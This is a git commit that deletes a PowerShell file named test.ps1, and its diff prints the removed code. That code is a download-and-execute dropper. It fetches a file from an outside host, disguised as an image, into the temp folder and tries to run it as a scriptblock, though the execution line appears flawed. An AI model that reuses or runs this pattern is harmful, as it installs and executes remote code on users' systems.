6231dd9a949bec1bf6fd70a3e0d7ff2fb3aa98d4
str1ctlyelnuno <105933376+str1ctlyelnuno@users.noreply.github.com>
2024-06-26 14:28:13 -0700

    Delete test.ps1

--- test.ps1
+++
@@ -1,5 +0,0 @@
-$down = New-Object System.Net.WebClient;
-$url = 'https://www.techno.ru/txt/PIC00001.jpg';
-$file = $env:tmp + '\1.jpg';
-$down.DownloadFile($url,$file);
-[scriptblock]::Create($file).Invoke();
